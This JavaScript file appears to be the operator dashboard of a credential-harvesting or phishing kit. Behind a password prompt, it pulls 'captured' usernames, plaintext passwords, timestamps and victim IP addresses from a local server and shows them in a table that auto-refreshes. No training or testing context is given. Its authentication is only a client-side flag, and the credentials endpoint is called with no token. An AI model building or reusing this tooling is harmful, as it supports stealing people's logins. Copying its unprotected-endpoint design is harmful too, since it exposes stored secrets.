let isAuthenticated = false;

document.addEventListener('DOMContentLoaded', function () {
    const adminLoginForm = document.getElementById('adminLoginForm');
    const loginSection = document.getElementById('loginSection');
    const dashboardSection = document.getElementById('dashboardSection');
    const logoutBtn = document.getElementById('logoutBtn');
    const refreshBtn = document.getElementById('refreshBtn');
    const notification = document.getElementById('notification');

    // Admin login
    adminLoginForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const password = document.getElementById('adminPassword').value;

        try {
            const response = await fetch('http://localhost:3000/api/admin/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ password })
            });

            const data = await response.json();

            if (data.success) {
                isAuthenticated = true;
                loginSection.style.display = 'none';
                dashboardSection.style.display = 'block';
                showNotification('Authentication successful!', 'success');
                loadCredentials();
            } else {
                showNotification('Invalid password', 'error');
            }
        } catch (error) {
            console.error('Error:', error);
            showNotification('Network error. Please check if the server is running.', 'error');
        }
    });

    // Logout
    logoutBtn.addEventListener('click', function () {
        isAuthenticated = false;
        loginSection.style.display = 'flex';
        dashboardSection.style.display = 'none';
        document.getElementById('adminPassword').value = '';
        showNotification('Logged out successfully', 'success');
    });

    // Refresh data
    refreshBtn.addEventListener('click', function () {
        loadCredentials();
        showNotification('Data refreshed', 'success');
    });

    // Load credentials
    async function loadCredentials() {
        if (!isAuthenticated) return;

        try {
            const response = await fetch('http://localhost:3000/api/admin/credentials');
            const data = await response.json();

            if (data.success) {
                displayCredentials(data.credentials);
                updateStats(data.credentials);
            } else {
                showNotification('Error loading credentials', 'error');
            }
        } catch (error) {
            console.error('Error:', error);
            showNotification('Error loading credentials', 'error');
        }
    }

    // Display credentials in table
    function displayCredentials(credentials) {
        const tbody = document.getElementById('credentialsBody');

        if (credentials.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="no-data">No credentials captured yet</td></tr>';
            return;
        }

        tbody.innerHTML = credentials.reverse().map(cred => `
            <tr>
                <td>${cred.id}</td>
                <td><strong>${escapeHtml(cred.username)}</strong></td>
                <td><code>${escapeHtml(cred.password)}</code></td>
                <td>${formatTimestamp(cred.timestamp)}</td>
                <td>${escapeHtml(cred.ipAddress || 'N/A')}</td>
            </tr>
        `).join('');
    }

    // Update statistics
    function updateStats(credentials) {
        document.getElementById('totalCount').textContent = credentials.length;

        if (credentials.length > 0) {
            const latest = credentials[credentials.length - 1];
            document.getElementById('latestTime').textContent = formatTime(latest.timestamp);
        } else {
            document.getElementById('latestTime').textContent = '-';
        }
    }

    // Format timestamp
    function formatTimestamp(timestamp) {
        const date = new Date(timestamp);
        return date.toLocaleString('en-US', {
            year: 'numeric',
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    }

    // Format time only
    function formatTime(timestamp) {
        const date = new Date(timestamp);
        return date.toLocaleString('en-US', {
            hour: '2-digit',
            minute: '2-digit'
        });
    }

    // Escape HTML to prevent XSS
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Show notification
    function showNotification(message, type) {
        notification.textContent = message;
        notification.className = `notification ${type} show`;

        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    }

    // Auto-refresh every 30 seconds if authenticated
    setInterval(() => {
        if (isAuthenticated) {
            loadCredentials();
        }
    }, 30000);
});
